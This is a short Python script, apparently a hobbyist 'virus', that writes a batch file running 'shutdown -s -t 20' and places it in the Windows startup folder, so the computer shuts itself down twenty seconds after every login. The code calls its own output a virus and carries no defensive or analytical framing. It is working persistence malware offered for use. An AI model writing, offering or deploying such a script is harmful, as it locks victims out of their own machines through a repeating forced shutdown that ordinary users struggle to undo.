# Importing External Libraries/Modules
import winshell     # Will get the shell:startup folder regardless of any User Name
import os           # For creating, writing, removing files & detetcting Directories
import shutil       # For moving File to the shell:startup folder

startup = winshell.startup()    # Startup Folder Location
# print(os.listdir(startup))    # Debugging Purpose

batchFile = 'shutup.bat'        # Batch File name stored in variable

# Will create a batchfile, and then it will write contents in it
with open(batchFile, 'w') as file:
    file.write("shutdown -s -t 20")     # The Batch Script Code


virusPathtoFile = f"{startup}\{batchFile}"      # The batch file location in the startup folder if we move the batch file in the startup folder 
# print(virusPathtoFile)    # Debugging Purpose


# If the batch file exists, it will remove the batch file and then again make the batch file, else it will just move the batch file in the directory 
if os.path.exists(virusPathtoFile):
    os.remove(virusPathtoFile)
    shutil.move(batchFile, startup) 

else:    
    shutil.move(batchFile, startup)
